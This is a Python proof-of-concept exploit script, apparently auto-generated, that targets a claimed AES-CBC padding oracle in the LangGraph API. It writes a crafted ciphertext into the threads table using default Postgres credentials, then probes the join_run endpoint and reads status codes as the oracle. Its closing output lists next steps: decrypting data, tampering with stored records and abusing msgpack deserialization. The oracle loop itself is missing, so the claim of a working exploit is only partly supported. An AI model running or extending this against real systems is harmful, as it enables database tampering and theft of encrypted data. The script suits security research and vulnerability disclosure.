#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: langgraph-000
# Sink: decryptor
# Auto-generated — run with: python3 langgraph_deployment_multiple_critical_decryptor.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: LangGraph API AES-CBC Padding Oracle Exploit via join_run

This PoC demonstrates how an attacker with write access to the database can exploit
the AES-CBC encryption without HMAC to perform a padding oracle attack. The attack
works by:

1. Writing a malicious ciphertext to the thread's values field in the database
2. Triggering the join_run endpoint which decrypts the field
3. Observing the response to determine if padding is valid (padding oracle)

The vulnerability exists because:
- AES-CBC is used without HMAC authentication
- The decryption path is reachable from join_run with user-controlled thread_id
- Database content is not validated before decryption

WARNING: This is a proof-of-concept for security research only.
"""

import json
import uuid
import sys
import time
from typing import Optional, Tuple
import urllib.request
import urllib.error
import urllib.parse


# =============================================================================
# Configuration
# =============================================================================

# Target LangGraph API endpoint
TARGET_HOST = "http://localhost:8000"  # Default LangGraph API port

# Database connection (attacker must have write access)
# In a real scenario, this could be via SQL injection or direct DB access
DB_HOST = "localhost"
DB_PORT = 5432
DB_NAME = "langgraph"
DB_USER = "postgres"
DB_PASSWORD = "postgres"

# Thread ID to target (will be created if doesn't exist)
TARGET_THREAD_ID = str(uuid.uuid4())

# Run ID for the join endpoint
TARGET_RUN_ID = str(uuid.uuid4())


# =============================================================================
# Helper Functions
# =============================================================================

def create_padding_oracle_ciphertext(plaintext: bytes, block_size: int = 16) -> bytes:
    """
    Create a ciphertext that will trigger padding oracle behavior.
    
    In a real attack, this would be crafted to exploit the padding oracle
    to decrypt arbitrary data. For this PoC, we create a simple test case.
    """
    # For demonstration, we create a ciphertext with known padding
    # In a real attack, this would be iteratively modified
    iv = b'\x00' * block_size
    # Create a ciphertext that will cause padding errors when decrypted
    ciphertext = b'\x41' * (block_size * 2)  # Invalid ciphertext
    return iv + ciphertext


def write_malicious_data_to_db(thread_id: str, ciphertext: bytes) -> bool:
    """
    Write malicious ciphertext to the database.
    
    This simulates an attacker with write access to the database.
    In a real scenario, this could be achieved through:
    - SQL injection
    - Direct database access
    - Other vulnerabilities in the application
    """
    try:
        import psycopg2
        
        conn = psycopg2.connect(
            host=DB_HOST,
            port=DB_PORT,
            dbname=DB_NAME,
            user=DB_USER,
            password=DB_PASSWORD
        )
        cur = conn.cursor()
        
        # Create a thread with malicious encrypted data
        # The encryption marker tells the system to decrypt this data
        encrypted_data = {
            "__encryption_context__": {
                "type": "aes",
                "version": 1
            },
            "data": ciphertext.hex()
        }
        
        # Insert or update the thread with malicious data
        cur.execute("""
            INSERT INTO threads (thread_id, values, status, created_at, updated_at)
            VALUES (%s, %s, 'running', NOW(), NOW())
            ON CONFLICT (thread_id) 
            DO UPDATE SET values = %s, updated_at = NOW()
        """, (thread_id, json.dumps(encrypted_data), json.dumps(encrypted_data)))
        
        conn.commit()
        cur.close()
        conn.close()
        return True
        
    except ImportError:
        print("[!] psycopg2 not installed. Cannot write to database directly.")
        print("[*] In a real attack, you would need another way to write to the DB.")
        return False
    except Exception as e:
        print(f"[!] Database error: {e}")
        return False


def trigger_join_endpoint(thread_id: str, run_id: str) -> Tuple[int, Optional[str]]:
    """
    Trigger the join_run endpoint which will decrypt the thread data.
    
    This is the padding oracle - the response will differ based on whether
    the padding is valid or not.
    """
    url = f"{TARGET_HOST}/threads/{thread_id}/runs/{run_id}/join"
    
    try:
        req = urllib.request.Request(url, method="GET")
        # Add headers that might be required
        req.add_header("Accept", "application/json")
        
        with urllib.request.urlopen(req, timeout=10) as response:
            status = response.status
            body = response.read().decode('utf-8')
            return status, body
            
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8') if e.fp else None
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return -1, None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return -1, None


def analyze_response(status: int, body: Optional[str]) -> str:
    """
    Analyze the response to determine if padding oracle attack is working.
    
    Different error responses indicate different padding states:
    - 200 OK: Padding was valid (data decrypted successfully)
    - 400/422: Invalid padding detected
    - 500: Internal error during decryption
    """
    if status == 200:
        return "VALID_PADDING - Data decrypted successfully"
    elif status in (400, 422):
        return "INVALID_PADDING - Padding error detected"
    elif status == 500:
        return "INTERNAL_ERROR - Possible decryption failure"
    else:
        return f"UNKNOWN_RESPONSE - Status {status}"


# =============================================================================
# Main Exploit Logic
# =============================================================================

def main():
    print("=" * 60)
    print("LangGraph API AES-CBC Padding Oracle PoC")
    print("=" * 60)
    print()
    
    # Step 1: Check if target is reachable
    print("[*] Step 1: Checking target availability...")
    try:
        req = urllib.request.Request(f"{TARGET_HOST}/health")
        with urllib.request.urlopen(req, timeout=5) as response:
            print(f"[+] Target is reachable (status {response.status})")
    except Exception as e:
        print(f"[!] Target not reachable: {e}")
        print("[*] Make sure the LangGraph API is running on", TARGET_HOST)
        sys.exit(1)
    
    # Step 2: Create malicious ciphertext
    print("\n[*] Step 2: Creating malicious ciphertext...")
    # For this PoC, we create a ciphertext that will cause a padding error
    # In a real attack, this would be iteratively modified to exploit the oracle
    test_plaintext = b"test_padding_oracle"
    malicious_ciphertext = create_padding_oracle_ciphertext(test_plaintext)
    print(f"[+] Created ciphertext of length {len(malicious_ciphertext)} bytes")
    
    # Step 3: Write malicious data to database
    print("\n[*] Step 3: Writing malicious data to database...")
    if not write_malicious_data_to_db(TARGET_THREAD_ID, malicious_ciphertext):
        print("[!] Failed to write to database. Cannot proceed with PoC.")
        print("[*] Ensure you have database write access and psycopg2 is installed.")
        sys.exit(1)
    print(f"[+] Written malicious data for thread {TARGET_THREAD_ID}")
    
    # Step 4: Trigger the padding oracle
    print("\n[*] Step 4: Triggering padding oracle via join_run endpoint...")
    print(f"[*] Thread ID: {TARGET_THREAD_ID}")
    print(f"[*] Run ID: {TARGET_RUN_ID}")
    
    status, body = trigger_join_endpoint(TARGET_THREAD_ID, TARGET_RUN_ID)
    
    if status == -1:
        print("[!] Failed to trigger endpoint")
        sys.exit(1)
    
    result = analyze_response(status, body)
    print(f"[*] Response status: {status}")
    print(f"[*] Result: {result}")
    
    # Step 5: Demonstrate the oracle
    print("\n[*] Step 5: Demonstrating padding oracle behavior...")
    print("[*] The oracle can be used to decrypt arbitrary data by:")
    print("  1. Modifying the ciphertext one byte at a time")
    print("  2. Observing which modifications result in valid padding")
    print("  3. Recovering the plaintext through the oracle responses")
    
    # Show the response body for analysis
    if body:
        print(f"\n[*] Response body (first 500 chars):")
        print(body[:500])
    
    print("\n" + "=" * 60)
    print("PoC Complete")
    print("=" * 60)
    print()
    print("[*] Summary:")
    print(f"  - Target: {TARGET_HOST}")
    print(f"  - Thread: {TARGET_THREAD_ID}")
    print(f"  - Oracle result: {result}")
    print()
    print("[*] To fully exploit this vulnerability:")
    print("  1. Use the padding oracle to decrypt arbitrary ciphertexts")
    print("  2. Modify encrypted data in the database")
    print("  3. Exploit msgpack deserialization if decrypted data contains blobs")
    print()
    print("[!] This PoC demonstrates the vulnerability exists.")
    print("[!] A full exploit would require iterating through ciphertext blocks.")


if __name__ == "__main__":
    main()
